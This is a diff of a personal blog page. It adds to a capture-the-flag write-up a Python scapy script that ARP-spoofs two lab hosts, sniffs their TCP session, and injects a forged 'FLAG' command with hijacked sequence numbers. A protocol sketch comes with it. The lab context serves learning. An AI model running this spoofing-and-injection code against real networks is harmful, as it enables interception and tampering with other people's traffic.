@@ -319,7 +319,7 @@
 
 
                 <time class="article-time--reading">
-                    8 minute read
+                    11 minute read
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -330,7 +330,7 @@
 
 
                 <time class="article-words">
-                    1642 字
+                    2212 字
                 </time>
             </div>
         
@@ -946,6 +946,240 @@
 </span></span><span class="line"><span class="cl"><span class="c1">#ok, it is not so good as I thought, and I should try to use scripts instead of manually using the terminals</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>Ok, finally I figured it out with the help of discord friends! As we know we can&rsquo;t manually use the terminals so we should use python scripts with <strong>scapy</strong>. There&rsquo;is a very cool function called <span class="spoiler" > sniffer </span>
+ so we could use it to accept packets between x.0.0.3 and x.0.0.4</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">//</span><span class="n">a</span><span class="o">.</span><span class="n">py</span> <span class="o">==&gt;</span><span class="n">scripts</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#first craft a ARP packet to insert into them</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#if we can use `ip addr add 10.0.0.3/16 dev eth0` would be better maybe but this time I seem not to use it.</span>
+</span></span><span class="line"><span class="cl"><span class="n">sendp</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">get_if_hwaddr</span><span class="p">(</span><span class="s2">&#34;eth0&#34;</span><span class="p">))</span> <span class="o">/</span> <span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="s2">&#34;is-at&#34;</span><span class="p">,</span><span class="n">hwsrc</span><span class="o">=</span><span class="n">get_if_hwaddr</span><span class="p">(</span><span class="s2">&#34;eth0&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">psrc</span><span class="o">=</span><span class="s2">&#34;10.0.0.3&#34;</span><span class="p">,</span><span class="n">pdst</span><span class="o">=</span><span class="s2">&#34;10.0.0.4&#34;</span><span class="p">),</span><span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span> <span class="c1">#tell 10.0.0.4，where 10.0.0.3 it is</span>
+</span></span><span class="line"><span class="cl"><span class="n">sendp</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">get_if_hwaddr</span><span class="p">(</span><span class="s2">&#34;eth0&#34;</span><span class="p">))</span> <span class="o">/</span> <span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="s2">&#34;is-at&#34;</span><span class="p">,</span><span class="n">hwsrc</span><span class="o">=</span><span class="n">get_if_hwaddr</span><span class="p">(</span><span class="s2">&#34;eth0&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">psrc</span><span class="o">=</span><span class="s2">&#34;10.0.0.4&#34;</span><span class="p">,</span><span class="n">pdst</span><span class="o">=</span><span class="s2">&#34;10.0.0.3&#34;</span><span class="p">),</span><span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span> <span class="c1">#tell 10.0.0.3，where 10.0.0.4 it is</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#global!</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">dst</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">src</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ipdst</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ipsrc</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ipflags</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sport</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">dport</span> <span class="o">=</span> <span class="mi">31337</span>
+</span></span><span class="line"><span class="cl"><span class="n">flags</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">seq</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">ack</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">CallBack</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#print ( packet.show() )</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">packet</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="s1">&#39;TCP&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#print (&#34;10.0.0.4 sport:&#34;,packet[&#39;TCP&#39;].sport)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#print (&#34;dest Port:&#34;,packet[&#39;TCP&#39;].dport) #31337</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">key</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">dst</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">src</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">ipdst</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">ipsrc</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">ipflags</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">sport</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">dport</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">flags</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">seq</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">ack</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;src:&#34;</span><span class="p">,</span><span class="n">packet</span><span class="p">[</span><span class="s1">&#39;IP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;flags:&#34;</span><span class="p">,</span><span class="n">packet</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">flags</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;seq:&#34;</span><span class="p">,</span><span class="n">packet</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">seq</span><span class="p">,</span><span class="s2">&#34;ack:&#34;</span><span class="p">,</span><span class="n">packet</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">ack</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;load:&#34;</span><span class="p">,</span><span class="n">packet</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;IP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="o">==</span><span class="s1">&#39;10.0.0.4&#39;</span> <span class="ow">and</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">!=</span> <span class="sa">b</span><span class="s1">&#39;ECHO</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">key</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">load</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;IP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="s1">&#39;10.0.0.4&#39;</span> <span class="ow">and</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;ECHO</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;echo!!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">packet</span><span class="o">.</span><span class="n">show</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;IP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="s1">&#39;10.0.0.3&#39;</span> <span class="ow">and</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;COMMANDS:</span><span class="se">\n</span><span class="s1">ECHO</span><span class="se">\n</span><span class="s1">FLAG</span><span class="se">\n</span><span class="s1">COMMAND:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;COMMAND!!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">packet</span><span class="o">.</span><span class="n">show</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ipdst</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;IP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">src</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ipsrc</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;IP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span>
+</span></span><span class="line"><span class="cl">                <span class="n">flags</span> <span class="o">=</span> <span class="s1">&#39;PA&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ipflags</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;IP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">flags</span>
+</span></span><span class="line"><span class="cl">                <span class="n">dst</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;Ethernet&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">src</span>
+</span></span><span class="line"><span class="cl">                <span class="n">src</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;Ethernet&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span>
+</span></span><span class="line"><span class="cl">                <span class="n">dport</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">sport</span>
+</span></span><span class="line"><span class="cl">                <span class="n">sport</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">dport</span>
+</span></span><span class="line"><span class="cl">                <span class="n">seq</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">ack</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ack</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="s1">&#39;TCP&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">seq</span><span class="o">+</span><span class="mi">29</span>
+</span></span><span class="line"><span class="cl">                <span class="n">raw_pkt</span> <span class="o">=</span> <span class="n">Raw</span><span class="p">(</span><span class="n">load</span><span class="o">=</span><span class="s1">&#39;FLAG</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">src</span><span class="p">,</span><span class="n">dst</span><span class="o">=</span><span class="n">dst</span><span class="p">)</span> <span class="o">/</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">ipsrc</span><span class="p">,</span><span class="n">dst</span><span class="o">=</span><span class="n">ipdst</span><span class="p">,</span><span class="n">flags</span><span class="o">=</span><span class="n">ipflags</span><span class="p">)</span> <span class="o">/</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">TCP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">dport</span><span class="p">,</span><span class="n">sport</span><span class="o">=</span><span class="n">sport</span><span class="p">,</span><span class="n">seq</span><span class="o">=</span><span class="n">seq</span><span class="p">,</span><span class="n">ack</span><span class="o">=</span><span class="n">ack</span><span class="p">,</span><span class="n">flags</span><span class="o">=</span><span class="n">flags</span><span class="p">)</span> <span class="o">/</span> <span class="n">raw_pkt</span><span class="p">)</span><span class="o">.</span><span class="n">display</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                <span class="n">sendp</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">src</span><span class="p">,</span><span class="n">dst</span><span class="o">=</span><span class="n">dst</span><span class="p">)</span> <span class="o">/</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">ipsrc</span><span class="p">,</span><span class="n">dst</span><span class="o">=</span><span class="n">ipdst</span><span class="p">,</span><span class="n">flags</span><span class="o">=</span><span class="n">ipflags</span><span class="p">)</span> <span class="o">/</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">TCP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">dport</span><span class="p">,</span><span class="n">sport</span><span class="o">=</span><span class="n">sport</span><span class="p">,</span><span class="n">seq</span><span class="o">=</span><span class="n">seq</span><span class="p">,</span><span class="n">ack</span><span class="o">=</span><span class="n">ack</span><span class="p">,</span><span class="n">flags</span><span class="o">=</span><span class="n">flags</span><span class="p">)</span> <span class="o">/</span> <span class="n">raw_pkt</span><span class="p">,</span><span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">#print(e)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;no load&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=========================&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#print (&#34;offset:&#34;,packet[&#39;TCP&#39;].dataofs) #data offset</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">filter</span><span class="o">=</span><span class="s2">&#34;tcp&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#the key function!</span>
+</span></span><span class="line"><span class="cl"><span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="nb">filter</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">CallBack</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="s1">&#39;eth0&#39;</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">50</span><span class="p">)</span> <span class="c1">#count of data packet</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And I should tell the principle and theory here:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="m">4</span> -&gt; <span class="m">3</span> SYN
+</span></span><span class="line"><span class="cl"><span class="m">3</span> -&gt; <span class="m">4</span> SYNACK
+</span></span><span class="line"><span class="cl"><span class="m">4</span> -&gt; <span class="m">3</span> ACK
+</span></span><span class="line"><span class="cl"><span class="m">3</span> -&gt; <span class="m">4</span> PSHACK Secret
+</span></span><span class="line"><span class="cl"><span class="m">4</span> -&gt; <span class="m">3</span> ACK
+</span></span><span class="line"><span class="cl"><span class="m">4</span> -&gt; <span class="m">3</span> PSHACK Key data
+</span></span><span class="line"><span class="cl"><span class="m">3</span> -&gt; <span class="m">4</span> ACK
+</span></span><span class="line"><span class="cl"><span class="m">3</span> -&gt; <span class="m">4</span> PSHACK COMMANDLIST <span class="o">(</span>contain <span class="nb">echo</span> and flag<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">4</span> -&gt; <span class="m">3</span> ACK
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#we should replace the ECHO packet from 4 or be quicker than it</span>
+</span></span><span class="line"><span class="cl"><span class="m">4</span> -&gt; <span class="m">3</span> PSHACK ECHO
+</span></span><span class="line"><span class="cl">replace with
+</span></span><span class="line"><span class="cl"><span class="m">4</span> -&gt; <span class="m">3</span> PSHACK FLAG
+</span></span><span class="line"><span class="cl"><span class="c1">#and we can see the flag here</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">3</span> -&gt; <span class="m">4</span> ACK
+</span></span><span class="line"><span class="cl"><span class="m">4</span> -&gt; <span class="m">3</span> PSHACK hello world
+</span></span><span class="line"><span class="cl"><span class="m">3</span> -&gt; <span class="m">4</span> ACK
+</span></span><span class="line"><span class="cl"><span class="m">3</span> -&gt; <span class="m">4</span> PSHACK hello world
+</span></span><span class="line"><span class="cl"><span class="m">4</span> -&gt; <span class="m">3</span> ACK
+</span></span><span class="line"><span class="cl"><span class="m">4</span> -&gt; <span class="m">3</span> FINACK
+</span></span><span class="line"><span class="cl"><span class="m">3</span> -&gt; <span class="m">4</span> FINACK
+</span></span><span class="line"><span class="cl"><span class="m">4</span> -&gt; <span class="m">3</span> ACK
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>what we should do is to check the packet of <code>COMMAND</code> and the packet of <code>ECHO</code> , then craft a <code>FLAG</code> packet like <code>ECHO</code> but quicker than it as soon as we get the packet of <code>COMMAND</code>. The ipsrc, ipdst, src, dst, dport, sport, seq, ack, flags, ipflags are the most important to get.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">/challenge/run
+</span></span><span class="line"><span class="cl">python a.py
+</span></span><span class="line"><span class="cl"><span class="c1">#wait and get flag</span>
+</span></span></code></pre></td></tr></table>
+</div>
 </div>
 </section>
 
@@ -1163,7 +1397,7 @@
         
             
         
-        共 17.68k 字 · 共 9篇文章
+        共 18.25k 字 · 共 9篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
